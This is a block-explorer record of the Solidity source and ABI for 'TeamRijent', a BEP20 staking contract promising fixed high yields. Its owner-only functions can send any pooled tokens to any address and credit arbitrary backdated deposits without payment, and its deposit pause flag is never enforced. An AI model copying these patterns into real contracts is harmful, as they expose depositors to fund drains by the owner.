{"SourceCode": "// SPDX-License-Identifier: none\r\npragma solidity ^0.8.10;\r\n\r\n// interface\r\ninterface BEP20{\r\n    function totalSupply() external view returns (uint theTotalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\n\r\ncontract TeamRijent{\r\n  struct Tariff {\r\n    uint time;\r\n    uint percent;\r\n  }\r\n  \r\n  struct Deposit {\r\n    uint tariff;\r\n    uint amount;\r\n    uint at;\r\n    bool reinvest;\r\n    uint withdrawnPrincipal;\r\n    uint principalWithdrawnAt;\r\n    uint nextPrincipalWithdrawalAt;\r\n  }\r\n  \r\n  struct Investor {\r\n    bool registered;\r\n    Deposit[] deposits;\r\n    uint invested;\r\n    uint paidAt;\r\n    uint withdrawn;\r\n    uint reinvest;\r\n  }\r\n  \r\n    \r\n  uint MIN_DEPOSIT = 100 * (10**9) ;\r\n  uint MIN_WITHDRAWAL = 100 * (10**9) ;\r\n  address public contractAddr = address(this);\r\n  address public owner = msg.sender;\r\n  address public updater = msg.sender;\r\n  address public token;\r\n  bool public depositStatus;\r\n  \r\n  Tariff[] public tariffs;\r\n  uint public totalInvestors;\r\n  uint public totalInvested;\r\n  uint public totalWithdrawal;\r\n  uint public totalReinvest;\r\n  uint public principalWithdrawalInterval = 7 days;\r\n  \r\n  mapping (address => Investor) public investors;\r\n  \r\n  event DepositAt(address user, uint tariff, uint amount);\r\n  event ReDepositAt(address user, uint tariff, uint amount);\r\n  event Withdraw(address user, uint amount);\r\n  event OwnershipTransferred(address);\r\n  event WithdrawPrincipal(address user, uint amount, uint withdrawnAt, uint plan);\r\n  \r\n\r\n \r\n  \r\n  constructor() {\r\n    tariffs.push(Tariff(360 days, 12*3));\r\n    tariffs.push(Tariff(720 days, 24*5));\r\n    tariffs.push(Tariff(1440 days, 48*6));\r\n\r\n    token = 0x913aFbBA462d6ae230344209d0Bd11CE3CE92Ed1; // RTC Token\r\n\r\n    owner = msg.sender;\r\n    updater = msg.sender;\r\n    depositStatus = true;\r\n  }\r\n\r\n  function transferOwnership(address to) external {\r\n      require(msg.sender == owner, \"Only owner\");\r\n      require(to != address(0), \"Cannot transfer ownership to zero address\");\r\n      owner = to;\r\n      emit OwnershipTransferred(to);\r\n  }\r\n\r\n  function changeUpdater(address to) external {\r\n      require(msg.sender == owner, \"Only owner\");\r\n      require(to != address(0), \"invalid address\");\r\n      updater = to;\r\n  }\r\n\r\n\r\n\r\n  function changeDepositStatus(bool _depositStatus) external {\r\n      require (msg.sender==owner,\" Only Owner\");\r\n      depositStatus = _depositStatus;\r\n  }\r\n  \r\n  function deposit(uint tariff, uint amount) external {\r\n        require(amount >= MIN_DEPOSIT);\r\n        require(tariff < tariffs.length);\r\n        uint currentTime = block.timestamp;\r\n        if (!investors[msg.sender].registered) {\r\n            investors[msg.sender].registered = true;\r\n            totalInvestors++;\r\n        }\r\n\r\n        investors[msg.sender].invested += amount;\r\n        totalInvested += amount;\r\n        Tariff storage tariffObj = tariffs[tariff];\r\n        uint nextPrincipalWithdrawalDate = tariffObj.time + currentTime;\r\n        investors[msg.sender].deposits.push(Deposit(tariff, amount, currentTime,false,0,currentTime,nextPrincipalWithdrawalDate));\r\n        BEP20 _token = BEP20(token);\r\n        require(_token.balanceOf(msg.sender) >= amount, \"Insufficient balance of user\");\r\n        _token.transferFrom(msg.sender, contractAddr, amount );\r\n\r\n        emit DepositAt(msg.sender, tariff, amount);\r\n\t}\r\n\r\n    function swapContract(address addr, uint[] memory _amounts, uint[] memory _times) external {\r\n       require(msg.sender == owner || msg.sender == updater, \"Permission error\");\r\n        require(_amounts.length == _times.length, \"Array length error\");\r\n        uint len = _amounts.length;\r\n        uint tariff = 1;\r\n        Tariff storage tariffObj = tariffs[tariff];\r\n        for(uint i = 0; i < len; i++){\r\n            uint amount = _amounts[i];\r\n            uint currentTime = _times[i];\r\n            investors[addr].registered = true;\r\n            \r\n            investors[addr].invested += amount;\r\n            \r\n            uint nextPrincipalWithdrawalDate = tariffObj.time + currentTime;\r\n            investors[addr].deposits.push(Deposit(tariff, amount, currentTime,false,0,currentTime,nextPrincipalWithdrawalDate));\r\n        }\r\n        \r\n\t  }\r\n\r\n    function swapContractMultiple(address[] memory _addr, uint[][] memory _amounts, uint[][] memory _times) external {\r\n       require(msg.sender == owner || msg.sender == updater, \"Permission error\");\r\n       uint tariff = 1;\r\n       Tariff storage tariffObj = tariffs[tariff];\r\n       for(uint j = 0; j < _addr.length; j++){\r\n          require(_amounts[j].length == _times[j].length, \"Array length error\");\r\n          uint len = _amounts[j].length;\r\n          address addr = _addr[j];\r\n          for(uint i = 0; i < len; i++){\r\n              uint amount = _amounts[j][i];\r\n              uint currentTime = _times[j][i];\r\n              investors[addr].registered = true;\r\n              \r\n              investors[addr].invested += amount;\r\n              \r\n              uint nextPrincipalWithdrawalDate = tariffObj.time + currentTime;\r\n              investors[addr].deposits.push(Deposit(tariff, amount, currentTime,false,0,currentTime,nextPrincipalWithdrawalDate));\r\n          }\r\n       }\r\n\t  }\r\n\r\n   function reDeposit(uint tariff) external {\r\n        uint amount = withdrawableMint(msg.sender);\r\n\r\n        require(amount >= MIN_DEPOSIT);\r\n        require(tariff == 1 || tariff == 2,\"Re Deposit allowed only in Plan 2 and Plan 3\");\r\n        uint currentTime = block.timestamp;\r\n        if (!investors[msg.sender].registered) {\r\n            investors[msg.sender].registered = true;\r\n            totalInvestors++;\r\n        }\r\n        investors[msg.sender].reinvest += amount;\r\n        investors[msg.sender].paidAt = currentTime;\r\n        totalReinvest+=amount;\r\n\r\n        investors[msg.sender].invested += amount;\r\n        totalInvested += amount;\r\n\r\n        Tariff storage tariffObj = tariffs[tariff];\r\n        \r\n        uint nextPrincipalWithdrawalDate = tariffObj.time + currentTime;\r\n        investors[msg.sender].deposits.push(Deposit(tariff, amount, currentTime,true,0,currentTime,nextPrincipalWithdrawalDate));\r\n        \r\n        emit ReDepositAt(msg.sender, tariff, amount);\r\n\t} \r\n  \r\n  \r\n  function withdrawPrincipal(uint index) external {\r\n    Investor storage investor = investors[msg.sender];\r\n    Deposit storage dep = investor.deposits[index];\r\n    require(investor.registered==true,\"Invalid User\");\r\n    require(dep.nextPrincipalWithdrawalAt <= block.timestamp , \"Withdrawn Time not reached\");\r\n    \r\n    require(dep.withdrawnPrincipal < dep.amount, \"No Principal Found\");\r\n    uint currentTime = block.timestamp;\r\n    \r\n    uint withdrawnAmt = dep.amount*5/100;\r\n    \r\n    BEP20 _token = BEP20(token);\r\n    require(_token.balanceOf(contractAddr) >= withdrawnAmt, \"Insufficient Contract Balance\");\r\n    _token.transfer(msg.sender, withdrawnAmt);\r\n\r\n    dep.withdrawnPrincipal += withdrawnAmt;\r\n    dep.principalWithdrawnAt = currentTime;\r\n    //dep.nextPrincipalWithdrawalAt =  currentTime + 7 days;\r\n    dep.nextPrincipalWithdrawalAt =  currentTime + principalWithdrawalInterval;\r\n\r\n    emit WithdrawPrincipal(msg.sender, withdrawnAmt, currentTime, index);\r\n  }\r\n\r\n  function withdrawMint() external {\r\n    require(investors[msg.sender].registered==true,\"Invalid User\");\r\n    uint amount = withdrawableMint(msg.sender);\r\n    require(amount>=MIN_WITHDRAWAL,\"Minimum Withdraw Limit Exceed\");\r\n    BEP20 _token = BEP20(token);\r\n    require(_token.balanceOf(contractAddr) >= amount, \"Insufficient Contract Balance\");\r\n    if (_token.transfer(msg.sender, amount)) {\r\n      investors[msg.sender].withdrawn += amount;\r\n      investors[msg.sender].paidAt = block.timestamp;\r\n      totalWithdrawal +=amount;\r\n\r\n      emit Withdraw(msg.sender, amount);\r\n    }\r\n  }\r\n\r\n\r\n  \r\n  \r\n \r\n  function withdrawalToAddress(address payable to, uint amount) external {\r\n        require(msg.sender == owner);\r\n        to.transfer(amount);\r\n  }\r\n\r\n  // Only owner can withdraw token \r\n    function withdrawToken(address tokenAddress, address to, uint amount) external {\r\n        require(msg.sender == owner, \"Only owner\");\r\n        BEP20 tokenNew = BEP20(tokenAddress);\r\n        tokenNew.transfer(to, amount);\r\n       \r\n    }\r\n  \r\n  function withdrawableMint(address user) public view returns (uint amount) {\r\n    Investor storage investor = investors[user];\r\n    \r\n    for (uint i = 0; i < investor.deposits.length; i++) {\r\n      Deposit storage dep = investor.deposits[i];\r\n      Tariff storage tariff = tariffs[dep.tariff];\r\n      \r\n      uint finish = dep.at + tariff.time;\r\n      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;\r\n      uint till = block.timestamp > finish ? finish : block.timestamp;\r\n\r\n      if (since < till) {\r\n        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;\r\n      }\r\n    }\r\n  }\r\n\r\n\r\n    /// Show Package Details\r\n    function packageDetails(address addr) public view returns(\r\n                    bool isRegsitered,\r\n                    uint[] memory packageAmt, \r\n                    uint[] memory planType, \r\n                    uint[] memory purchaseAt, \r\n                    uint[] memory withdrawnPrincipalAmt, \r\n                    uint[] memory withdrawnPrincipalAt, \r\n                    uint[] memory nextWithdrawnPrincipalAt,\r\n                    bool[] memory withdrawBtn,\r\n                    bool[] memory reinvestStatus\r\n                    ){\r\n        Investor storage investor = investors[addr];\r\n    \r\n   \r\n        uint len = investor.deposits.length;\r\n        packageAmt                     = new uint[](len);\r\n        planType                       = new uint[](len);\r\n        purchaseAt                     = new uint[](len);\r\n        withdrawnPrincipalAmt          = new uint[](len);\r\n        withdrawnPrincipalAt           = new uint[](len);\r\n        nextWithdrawnPrincipalAt       = new uint[](len);\r\n        withdrawBtn                    = new bool[](len);\r\n        reinvestStatus                 = new bool[](len);\r\n        for (uint i = 0; i < investor.deposits.length; i++) {\r\n            Deposit storage dep = investor.deposits[i];\r\n           \r\n            packageAmt[i]  = dep.amount;\r\n            planType[i] = dep.tariff; \r\n            purchaseAt[i]  = dep.at; \r\n            reinvestStatus[i] = dep.reinvest; \r\n            withdrawnPrincipalAmt[i]  = dep.withdrawnPrincipal; \r\n            withdrawnPrincipalAt[i]  = dep.principalWithdrawnAt; \r\n            nextWithdrawnPrincipalAt[i]  = dep.nextPrincipalWithdrawalAt; \r\n            withdrawBtn[i] = (dep.nextPrincipalWithdrawalAt < block.timestamp && dep.amount > dep.withdrawnPrincipal) ? true : false;\r\n        }\r\n        return (investor.registered,packageAmt, planType,purchaseAt,withdrawnPrincipalAmt,withdrawnPrincipalAt,nextWithdrawnPrincipalAt,withdrawBtn,reinvestStatus);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tariff\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"DepositAt\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tariff\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ReDepositAt\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"withdrawnAt\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"plan\",\"type\":\"uint256\"}],\"name\":\"WithdrawPrincipal\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_depositStatus\",\"type\":\"bool\"}],\"name\":\"changeDepositStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"changeUpdater\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tariff\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"depositStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"investors\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"registered\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"paidAt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"reinvest\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"packageDetails\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"isRegsitered\",\"type\":\"bool\"},{\"internalType\":\"uint256[]\",\"name\":\"packageAmt\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"planType\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"purchaseAt\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"withdrawnPrincipalAmt\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"withdrawnPrincipalAt\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"nextWithdrawnPrincipalAt\",\"type\":\"uint256[]\"},{\"internalType\":\"bool[]\",\"name\":\"withdrawBtn\",\"type\":\"bool[]\"},{\"internalType\":\"bool[]\",\"name\":\"reinvestStatus\",\"type\":\"bool[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"principalWithdrawalInterval\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tariff\",\"type\":\"uint256\"}],\"name\":\"reDeposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256[]\",\"name\":\"_amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_times\",\"type\":\"uint256[]\"}],\"name\":\"swapContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_addr\",\"type\":\"address[]\"},{\"internalType\":\"uint256[][]\",\"name\":\"_amounts\",\"type\":\"uint256[][]\"},{\"internalType\":\"uint256[][]\",\"name\":\"_times\",\"type\":\"uint256[][]\"}],\"name\":\"swapContractMultiple\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tariffs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalInvested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalInvestors\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReinvest\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWithdrawal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"updater\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawMint\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"withdrawPrincipal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"withdrawableMint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawalToAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TeamRijent", "CompilerVersion": "v0.8.10+commit.fc410830", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://393c98b0bb0c1359e12fcc3e83473d87251f4383c8be657b999e8e6fecd5398b"}